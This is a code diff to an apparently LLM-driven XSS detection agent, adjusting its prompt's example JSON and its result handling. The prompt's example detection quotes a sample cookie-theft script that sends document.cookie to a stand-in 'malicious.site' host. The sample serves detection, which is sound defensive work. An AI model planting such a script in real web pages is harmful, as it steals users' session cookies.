@@ -46,16 +46,16 @@ Examine the packet carefully for XSS patterns. Your response must be structured 
    - If NO: Brief confirmation that no XSS patterns were detected
 
 Example Response 1 (Attack Detected):
-{
+{{
     "xss_detected": "YES",
     "details": "Detected malicious XSS payload in packet. Found script: '<script>document.cookie.send('https://malicious.site')</script>'. This is a cookie theft attack attempting to exfiltrate session data to an external domain. The script directly accesses document.cookie and attempts unauthorized data transmission."
-}
+}}
 
 Example Response 2 (No Attack):
-{
+{{
     "xss_detected": "NO",
     "details": "No XSS attack patterns detected in packet payload. Payload was examined for script injection, event handlers, and encoded malicious content - none were found."
-}
+}}
 
 Remember:
 - Focus only on XSS patterns
@@ -81,10 +81,11 @@ def xss_agent(state: ParallelState):
       "format_instructions": xss_parser.get_format_instructions()
     })
     print("xss agent response: ", res)
-    print("xxs detected??: ", res.xss_detected)
-    return {"xss_agent_msg": str(res.details)}
+    print("xxs detected??: ", res["xss_detected"])
+    return {"xss_agent_msg": str(res["details"])}
 
   except Exception as e:
     print("ERROR invoking the chain in xss_agent:", e)
+    return {"xss_agent_msg": "Error invoking the chain. Ignore the output of the XSS Agent feedback for the final evaluation."}
 
 
